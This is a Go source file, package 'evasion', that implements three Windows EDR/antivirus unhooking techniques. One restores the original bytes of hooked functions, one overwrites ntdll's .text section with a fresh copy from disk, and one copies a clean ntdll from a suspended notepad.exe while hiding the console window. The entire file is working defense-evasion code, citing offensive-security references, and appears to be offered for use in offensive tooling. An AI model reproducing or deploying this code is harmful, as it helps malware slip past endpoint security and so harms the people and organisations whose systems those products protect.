package evasion

/*

References:
https://github.com/RedLectroid/APIunhooker
https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis

*/

import (
	"errors"
	"io/ioutil"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/Binject/debug/pe"
)

// This function unhooks given functions of especified dll
func ClassicUnhook(funcnames []string, dllpath string) error {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	GetModuleHandle := kernel32.NewProc("GetModuleHandleW")
	GetProcAddress := kernel32.NewProc("GetProcAddress")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

	// should be full path: C:\\Windows\\System32\\ntdll.dll
	lib, _ := windows.LoadLibrary(dllpath)
	defer windows.FreeLibrary(lib)

	for _, f := range funcnames {
		var assembly_bytes []byte

		procAddr, _ := windows.GetProcAddress(lib, f)

		ptr_bytes := (*[1 << 30]byte)(unsafe.Pointer(procAddr))
		funcBytes := ptr_bytes[:5:5]

		for i := 0; i < 5; i++ {
			assembly_bytes = append(assembly_bytes, funcBytes[i])
		}

		pHandle, _, err := GetCurrentProcess.Call()
    if pHandle == 0 {
      return err
    }

		// Convert dll name to pointer
		lib_ptr, err := windows.UTF16PtrFromString(strings.Split(dllpath, "\\")[3])
    if err != nil {
      return err
    }

		moduleHandle, _, err := GetModuleHandle.Call(uintptr(unsafe.Pointer(lib_ptr)))
    if moduleHandle == 0 {
      return err
    }

		func_ptr, err := windows.UTF16PtrFromString(f)
    if err != nil {
      return err
    }

		addr, _, err := GetProcAddress.Call(
			moduleHandle,
			uintptr(unsafe.Pointer(func_ptr)),
		)

    if addr == 0 {
      return err
    }

		// Overwrite address with original function bytes
		WriteProcessMemory.Call(
			pHandle,
			addr,
			uintptr(unsafe.Pointer(&assembly_bytes[0])),
			5,
			uintptr(0),
		)
	}

	return nil
}

// Load fresh DLL copy in memory
func FullUnhook(dlls_to_unhook []string) error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

  for _, dll_to_unhook := range dlls_to_unhook {
    if (!strings.HasPrefix(dll_to_unhook, "C:\\")) {
      dll_to_unhook = "C:\\Windows\\System32\\" + dll_to_unhook
    }

    f, err := ioutil.ReadFile(dll_to_unhook)
    if err != nil {
      return err
    }

    file, err := pe.Open(dll_to_unhook)
    if err != nil {
      return err
    }

    x := file.Section(".text")
    size := x.Size
    dll_bytes := f[x.Offset:x.Size]

    dll, err := windows.LoadDLL(dll_to_unhook)
    if err != nil {
      return err
    }

    dll_handle := dll.Handle
    dll_base := uintptr(dll_handle)
    dll_offset := uint(dll_base) + uint(x.VirtualAddress)
    
    regionsize := uintptr(size)
    var oldProtect uintptr

    r1, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&dll_offset)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
    if r1 != 0 {
      return err
    }

    for i := 0; i < len(dll_bytes); i++ {
      loc := uintptr(dll_offset + uint(i))
      mem := (*[1]byte)(unsafe.Pointer(loc))
      (*mem)[0] = dll_bytes[i]
    }

    r2, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&dll_offset)), uintptr(unsafe.Pointer(&regionsize)), oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
    if r2 != 0 {
      return err
    }
  }

  return nil
}

// Get a clean copy of ntdll from a suspended process (e.g. notepad.exe) and copy it to current process
func PerunsUnhook() error {
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  GetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
  CreateProcessW := kernel32.NewProc("CreateProcessW")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
  TerminateProcess := kernel32.NewProc("TerminateProcess")
  ShowWindow := windows.NewLazyDLL("user32.dll").NewProc("ShowWindow")

  hwnd, _, _ := GetConsoleWindow.Call()
  if hwnd == 0 {
    return errors.New("error calling GetConsoleWindow")
  }

  var SW_HIDE uintptr = 0
  ShowWindow.Call(hwnd, SW_HIDE)

  si:= &windows.StartupInfo{}
  pi := &windows.ProcessInformation{}

  cmd, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
  if err != nil {
    return err
  }

  CreateProcessW.Call(0, uintptr(unsafe.Pointer(cmd)), 0, 0, 0, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(si)), uintptr(unsafe.Pointer(pi)))

  pHandle, _, _ := GetCurrentProcess.Call()

  time.Sleep(5 * time.Second)

  file, err := pe.Open("C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    return err
  }

  x := file.Section(".text")
  size := x.Size

  dll, err := windows.LoadDLL("C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    return err
  }

  dll_handle := dll.Handle
  dll_base := uintptr(dll_handle)
  dll_offset := uint(dll_base) + uint(x.VirtualAddress)

  var data = make([]byte, size)
  var nbr uintptr = 0

  r1, _, err := ReadProcessMemory.Call(uintptr(pi.Process), uintptr(dll_offset), uintptr(unsafe.Pointer(&data[0])), uintptr(size), uintptr(unsafe.Pointer(&nbr)))
  if r1 == 0 {
    return err
  }

  ntdll_bytes := data
  ntdll_offset := dll_offset

  var nLength uintptr
  r2, _, err := WriteProcessMemory.Call(pHandle, uintptr(ntdll_offset), uintptr(unsafe.Pointer(&ntdll_bytes[0])), uintptr(uint32(len(ntdll_bytes))), uintptr(unsafe.Pointer(&nLength)))
  if r2 == 0 {
    return err
  }

  TerminateProcess.Call(uintptr(pi.Process), 0)

  return nil
}

